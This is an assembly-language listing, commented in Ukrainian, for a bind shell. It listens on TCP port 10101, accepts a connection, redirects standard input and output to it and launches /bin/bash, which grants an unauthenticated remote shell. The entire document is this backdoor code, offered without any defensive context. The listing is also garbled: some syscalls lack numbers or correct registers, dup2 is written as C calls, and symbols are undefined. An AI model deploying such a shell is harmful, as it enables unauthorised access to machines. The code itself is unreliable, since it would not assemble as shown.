; Оголошення секцій
.bss
sin: .space 16 ; Структура sockaddr_in

.data
sock: .long 0 ; Дескриптор сокета
fd: .long 0 ; Дескриптор з'єднання

.text
.global main

main:
    ; Створення TCP-сокета
    mov $AF_INET, %eax
    mov $SOCK_STREAM, %ebx
    mov $IPPROTO_TCP, %ecx
    syscall ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    mov %eax, sock ; Збереження дескриптора сокета

    ; Заповнення структури sockaddr_in
    movw $AF_INET, sin.sin_family
    movw $10101, %ax ; PORT = 10101
    xchgb %ah, %al ; htons(), AH ⇔ AL
    movw %ax, sin.sin_port

    ; Прив'язка сокета до адреси
    mov $SYS_BIND, %rax
    movq sock, %rdi
    movq sin, %rsi ; Адреса структури sin
    movq $0x10, %rdx ; sizeof(sockaddr_in) = 16
    syscall ; bind(SOCKFD, &sin, sizeof(sin))

    ; Слухання з'єднань
    mov $SYS_LISTEN, %rax
    movq sock, %rdi
    mov $1, %rdx ; backlog = 1
    syscall ; listen(sock, 1)

    ; Прийняття з'єднання
    mov $SYS_ACCEPT, %rax
    movq sock, %rdi
    mov $0, %rsi ; NULL
    mov $0, %rdx ; NULL
    syscall ; accept(sock, NULL, NULL)
    mov %eax, fd ; Збереження дескриптора з'єднання

    ; Перевизначення стандартних дескрипторів
    dup2(fd, 0) ; stdin
    dup2(fd, 1) ; stdout
    dup2(fd, 2) ; stderr

    ; Запуск /bin/bash
    mov $SYS_EXECVE, %rax
    mov $bash, %rdi ; /bin/bash
    mov $0, %rsi ; NULL
    mov $0, %rdx ; NULL
    syscall

    ; Вихід з програми
    mov $SYS_EXIT, %rax
    mov $0, %rdi
    syscall


